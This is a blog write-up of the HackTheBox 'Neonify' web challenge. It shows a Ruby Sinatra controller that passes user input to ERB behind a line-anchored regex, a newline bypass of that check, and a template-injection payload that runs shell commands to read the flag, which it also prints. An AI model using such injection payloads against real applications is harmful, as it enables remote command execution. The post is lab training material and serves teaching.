---
layout: post
title: Neonify HackTheBox Challenge - Writeup
categories: [HackTheBox Challenge]
tags: [hackthebox,hackthebox easy,web,hackthebox challenge]
img_path: /images/htb/challenges/neonify
---

> It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!

**Challenge created by:** [Codehead](https://app.hackthebox.com/users/129959)

After opening the ZIP, we are given a website structure built with Ruby.

```
$ ls
Dockerfile build-docker.sh* challenge/ config/
```

Looking inside `challenge`, specifically `challenge/controllers/neon.rb`, sending a post to `/`, it takes a parameter `neon` and checks its validated by a regex filter.
```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

From a glance at this regex I take a guess its a newline vulnerability, specifically CRLF.

If we inject a newline, this filter checks the first line only, so we could do an input like `a%0amalicious-payload%0aa` and get the middle executed.

I open Burp Suite, and use the proxy browser to intercept the POST request to edit it to the following:

```
POST / HTTP/1.1
...

neon=a%0atest!%0aa
```

and the response contains the illegal character!

```
...
<h1 class="glow">a
test!
a</h1>
...
```

Looking online I and some work-shopping, I find that we can do Ruby Template Injection. This is the payload I made: ``a%0a<%25=`whoami`%25>`` which returns `www`.

I use `ls` with the payload, see `flag.txt` and read it with `cat flag.txt` to get the flag.

Flag: <mark>HTB{r3pl4c3m3n7_s3cur1ty}</mark>

![Success](submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.